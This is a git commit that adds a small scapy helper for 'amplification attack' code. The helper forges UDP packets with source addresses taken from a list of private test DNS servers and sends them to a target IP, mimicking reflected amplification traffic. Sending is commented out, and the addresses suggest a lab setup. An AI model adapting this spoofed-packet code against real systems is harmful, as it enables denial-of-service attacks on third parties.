3533c21adc1f57a91f527f345647aee87761303c
RyunK, Lee <lrk222@naver.com>
2026-07-07 15:16:08 +0900

    feat: amplification attack 코드들 작성

---
+++ attacks/amplification_common.py
@@ -0,0 +1,21 @@
+from scapy.all import IP, UDP, Raw, send
+import random
+
+TEST_DNS_SERVERS  = [
+    "10.10.0.10",
+    "10.10.0.11",
+    "10.10.0.12",
+    "10.10.0.13",
+    "10.10.0.14",
+]
+
+def send_amp_random_packet(target_ip, target_port, sport, payload):
+
+    packet = (
+            IP(src=random.choice(TEST_DNS_SERVERS), dst=target_ip) /
+            UDP(sport=sport, dport=target_port) /
+            Raw(payload)
+        )
+
+    # 실제로 패킷을 보내면 안돼서 주석 처리
+    # send(packet, verbose=False)
